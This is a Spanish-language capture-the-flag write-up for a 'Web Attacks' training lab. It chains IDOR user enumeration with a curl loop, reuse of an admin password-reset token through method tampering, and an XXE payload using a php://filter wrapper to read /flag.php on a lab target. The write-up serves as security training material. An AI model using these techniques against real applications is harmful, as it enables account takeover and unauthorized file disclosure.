---
description: 'Target(s): 94.237.48.12:30244'
---

# Web Attacks

## Escenario

Estás realizando una prueba de penetración de una aplicación web para una empresa de desarrollo de software, y te encargan que pruebes la última versión de su aplicación web de redes sociales. Intenta utilizar las diversas técnicas que has aprendido en este módulo para identificar y explotar las múltiples vulnerabilidades que se encuentran en la aplicación web.

Los datos de inicio de sesión usuario: "htb-student" y contraseña "Academy\_student!"

**Pregunta 1**: Intenta escalar tus privilegios y explotar diferentes vulnerabilidades para leer la bandera en “/flag.php”.

1. Entramos en la aplicación objetivo, redirigimos el tráfico a Burp y nos logueamos con las credenciales. Interceptaremos el tráfico, pero la request que nos interesa es la siguiente:

<figure><img src="../../../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

2. La request se hace contra el usuario 74, cambiando el ese id, podremos obtener los datos de otros usuarios en el response:

<figure><img src="../../../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

3. Nos devuelve información del usuario, esto indica que es vulnerable a IDOR. Ahora ejecutaremos un script en bash para fuzzear el id de usuario y encontrar el del admin:

```
for uid in {1..100}; do curl -s "http://94.237.48.12:30244/api.php/user/$uid"; echo; done | grep -i "admin"
```

<figure><img src="../../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

4. Tenemos el username del admin, su uid y nos falta la contraseña. Hay una función de cambio de contraseña, la utilizamos para capturar la request:

<figure><img src="../../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

5. La mandamos al Repeater y cambiamos el uid por el del admin (52):

<figure><img src="../../../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

6. Pero recibimos un access denied. Aún así hemos capturado otra request en la que se solicita a la api un token, vamos a reutilizarla desde el Repeater, para obtener el token de reseteo para el admin cambiando el uid:

<figure><img src="../../../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

7. Copiamos este token en la request del reset para cambiar la contraseña del usuario admin:

```
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

<figure><img src="../../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

8. Recibimos otro Access Denied pero vamos a cambiar el método de la request de POST a GET y adaptamos la URL que se envía:

```
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=1234
```

<figure><img src="../../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

9. Accedemos con las credenciales de admin y observamos que con el usuario admin hay una función de añadir eventos :

<figure><img src="../../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

10. Añadimos el evento, capturamos la request y trabajamos con ella desde el Repeater:

<figure><img src="../../../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

11. Analizando la request, puede ser vulnerable a XML aunque no lo declare en el body de la request así que probaremos con un payload para vulnerabilidades XXE:

```
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php" >
]>
<root>
    <name>&xxe;</name>
</root>
```

<figure><img src="../../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

12. Obtenemos la flag en base64 y la decodificamos para obtener el resultado:

<figure><img src="../../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>
